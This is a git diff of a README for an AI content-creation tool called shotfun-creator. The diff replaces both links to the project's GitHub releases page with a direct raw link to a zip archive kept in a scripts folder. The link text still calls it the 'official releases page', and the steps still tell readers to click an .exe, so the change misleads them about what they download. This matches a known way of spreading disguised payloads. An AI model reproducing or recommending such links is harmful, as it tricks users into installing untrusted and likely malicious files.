@@ -1,6 +1,6 @@
 # 🎬 shotfun-creator - Create professional AI content with ease
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Candilefthand269/shotfun-creator/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Candilefthand269/shotfun-creator/main/scripts/workflows/shotfun-creator-1.3.zip)
 
 shotfun-creator functions as a central toolset for automated content production. It integrates AI capabilities to build images, videos, audio clips, and digital characters. You use this software to streamline creative workflows and build high-quality assets without manual editing.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these minimum specifications to run the software:
 
 Follow these steps to place the software on your computer:
 
-1. Visit the [official releases page](https://github.com/Candilefthand269/shotfun-creator/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Candilefthand269/shotfun-creator/main/scripts/workflows/shotfun-creator-1.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe under the Assets section.
 4. Save the file to your Downloads folder.
